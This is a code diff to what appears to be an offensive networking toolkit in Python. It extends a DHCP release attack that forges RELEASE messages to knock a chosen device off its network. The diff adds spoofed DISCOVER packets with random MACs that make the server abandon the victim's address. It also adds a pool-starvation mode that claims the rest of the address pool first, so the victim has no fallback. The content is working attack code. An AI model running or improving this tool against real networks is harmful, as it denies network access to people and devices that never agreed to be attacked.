@@ -5,6 +5,8 @@ from recon.network_scan import scan_subnet
 from recon.target_selector import select_device
 from recon.dhcp_discover import find_dhcp_server
 from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, mac2str
+from common.packet_utils import random_mac, random_xid
+from attacks.starvation import StarvationAttack
 
 class ReleaseAttack(BaseAttack):
     """
@@ -12,7 +14,7 @@ class ReleaseAttack(BaseAttack):
     Sends DHCP RELEASE messages to the server, releasing leases for specified IPs.
     """
 
-    def __init__(self, iface, logger=None, mantain_interval=30, maintain_count=None, mantain_timeout=None):
+    def __init__(self, iface, logger=None, mantain_interval=30, maintain_count=None, mantain_timeout=None, drain_pool=False):
         super().__init__(iface, logger)
         self.target_ip = None
         self.target_mac = None
@@ -21,6 +23,7 @@ class ReleaseAttack(BaseAttack):
         self.maintain_interval = mantain_interval
         self.maintain_count = maintain_count
         self.maintain_timeout = mantain_timeout
+        self.drain_pool = drain_pool
 
     def send_dhcp_release(self, iface: str, client_ip: str, client_mac: str, server_ip: str, server_mac: str):
         pkt = (
@@ -42,6 +45,34 @@ class ReleaseAttack(BaseAttack):
         )
 
         sendp(pkt, iface=iface, verbose=False)
+        self.logger.info("DHCP RELEASE sent for IP=%s (client MAC=%s, server=%s)", client_ip, client_mac, server_ip)
+
+    def send_dhcp_discover(self, iface: str, client_ip: str):
+        client_mac = random_mac()
+        pkt = (
+            Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff")
+            / IP(src="0.0.0.0", dst="255.255.255.255")
+            / UDP(sport=68, dport=67)
+            / BOOTP(
+                op=1,
+                htype=1,
+                hlen=6,
+                xid=random_xid(),
+                chaddr=mac2str(client_mac).ljust(16, b"\x00"),
+                ciaddr="0.0.0.0",
+                flags=0x8000,
+            )
+            / DHCP(
+                options=[
+                    ("message-type", "discover"),
+                    ("requested_addr", client_ip),
+                    ("param_req_list", [1, 3, 6, 28, 51, 54, 58, 59]),
+                    "end",
+                ]
+            ))
+
+        sendp(pkt, iface=iface, verbose=False)
+        self.logger.info("DHCP DISCOVER sent (spoofed MAC=%s) targeting IP=%s — triggers server ping-check/abandon", client_mac, client_ip)
 
     def maintain_target_lease(self):
         while (self.maintain_count is None or self.maintain_count > 0) and (self.maintain_timeout is None or self.maintain_timeout > 0) and not self.stopped:
@@ -68,7 +99,6 @@ class ReleaseAttack(BaseAttack):
                 continue
 
 
-            self.logger.info("Sending DHCP RELEASE for IP: %s", self.target_ip)
             self.send_dhcp_release(
                 iface=self.iface,
                 client_ip=self.target_ip,
@@ -76,13 +106,26 @@ class ReleaseAttack(BaseAttack):
                 server_ip=self.server_ip,
                 server_mac=self.server_mac,
             )
-            self.logger.info("DHCP RELEASE sent successfully for IP: %s", self.target_ip)
+            self.send_dhcp_discover(iface=self.iface, client_ip=self.target_ip)
+
             time.sleep(self.maintain_interval)
 
         
-        
+
     def run(self):
         try:
+            if self.drain_pool:
+                self.logger.info("Starting pool drain (StarvationAttack) in the background...")
+                self.pool_drain = StarvationAttack(iface=self.iface, maintain=True, exhaustion_timeout=5.0)
+                threading.Thread(target=self.pool_drain.run, daemon=True).start()
+                # Land-grab runs until no OFFER arrives for exhaustion_timeout seconds —
+                # wait for it to actually finish before releasing the target, otherwise
+                # the target's freed IP could just get re-offered to the real victim
+                # from an otherwise-still-open pool.
+                while not self.pool_drain._land_grab_done and not self.stopped:
+                    time.sleep(0.5)
+                self.logger.info("Pool drain land-grab finished — proceeding to release target.")
+
             self.logger.info("Discovering DHCP server on interface %s...", self.iface)
             device_info = find_dhcp_server(self.iface)
             self.server_ip, self.server_mac = device_info["ip"], device_info["mac"]
@@ -96,7 +139,6 @@ class ReleaseAttack(BaseAttack):
             self.logger.info("Selected target device: IP=%s MAC=%s", selection["target_ip"], selection["target_mac"])
 
             self.target_ip, self.target_mac = selection["target_ip"], selection["target_mac"]
-            self.logger.info("Sending DHCP RELEASE for IP: %s", self.target_ip)
             self.send_dhcp_release(
                 iface=self.iface,
                 client_ip=self.target_ip,
@@ -104,7 +146,7 @@ class ReleaseAttack(BaseAttack):
                 server_ip=self.server_ip,
                 server_mac=self.server_mac,
             )
-            self.logger.info("DHCP RELEASE sent successfully for IP: %s", self.target_ip)
+            self.send_dhcp_discover(iface=self.iface, client_ip=self.target_ip)
 
             manage_thread = threading.Thread(target=self.maintain_target_lease, daemon=True)
             manage_thread.start()
@@ -122,6 +164,10 @@ class ReleaseAttack(BaseAttack):
                             help="Number of times to maintain the lease (default: unlimited)")
         parser.add_argument("--maintain-timeout", type=int, default=None,
                             help="Total time in seconds to maintain the lease (default: unlimited)")
+        parser.add_argument("--drain-pool", action="store_true",
+                            help="Also run a StarvationAttack in the background to claim/hold the rest "
+                                 "of the pool, and wait for it to finish its land-grab before releasing "
+                                 "the target (so the victim has nowhere else to fall back to).")
 
     @classmethod
     def from_args(cls, args):
@@ -132,4 +178,5 @@ class ReleaseAttack(BaseAttack):
             mantain_interval=args.maintain_interval,
             maintain_count=args.maintain_count,
             mantain_timeout=args.maintain_timeout,
+            drain_pool=args.drain_pool,
         )
